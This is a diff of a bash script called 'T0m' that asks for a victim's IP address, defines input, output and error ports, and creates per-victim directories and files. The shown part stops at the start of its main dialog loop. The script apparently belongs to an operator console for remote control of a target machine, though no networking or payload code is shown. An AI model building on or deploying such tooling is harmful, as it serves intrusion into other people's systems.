@@ -1,41 +1,62 @@
 #!/bin/bash
 echo "[S] T0m running"
 
+echo -e "What is the IP address of victim?"
+read -p ":" ip
 
 outputport=12005
 inputport=12006
 errorport=12007
-dir="/home/$USER/.T0m"
+d="/home/$USER/t0m"
+dir="$d/$ip"
 inputfile="$dir/t0m.inp"
 errorfile="$dir/t0m.err"
 
 
-echo -n "Removing $dir ..."
-rm -r "$dir"
-echo "Done."
+if [ -d "$d" ]; then
+	echo "[S] $d exits."
+else
+	echo -n "[S] $d does not exists, creating..."
+	mkdir "$d"	
+	echo "Done."
+fi
 
 
-echo -e "What is the IP address of victim?"
-read -p ":" ip
+if [ -d "$dir" ]; then
+	echo "[S] $dir exits."
+else
+	echo -n "[S] $dir does not exists, creating..."
+	mkdir "$dir"	
+	echo "Done."
+fi
+
+
+if [ -f "$inputfile" ]; then
+	echo -n "[S] $inputfile exits, wiping..."
+	echo "" > "$inputfile"
+	echo "Done."
+else
+	echo -n "[S] $inputfile does not exists, creating..."
+	touch "$inputfile"
+	echo "Done."
+fi
+
+
+if [ -f "$errorfile" ]; then
+	echo -n "[S] $errorfile exits, wiping..."
+	echo "" > "$errorfile"
+	echo "Done."
+else
+	echo -n "[S] $errorfile does not exists, creating..."
+	touch "$errorfile"
+	echo "Done."
+fi
+
 
 
 echo "[S] Input port: $inputport"
 echo "[S] Output port: $outputport"
 echo "[S] Error port: $errorport"
-
-echo -n "[S] Creating $dir..."
-mkdir "$dir"
-echo "Done."
-
-echo -n "[S] Creating $inputfile as input file... "
-touch "$inputfile"
-echo "Done."
-
-echo -n "[S] Creating $errorfile as error file... "
-touch "$errorfile"
-echo "Done."
-
-
 
 echo "[S] Dialog window on port: $outputport"
 while :
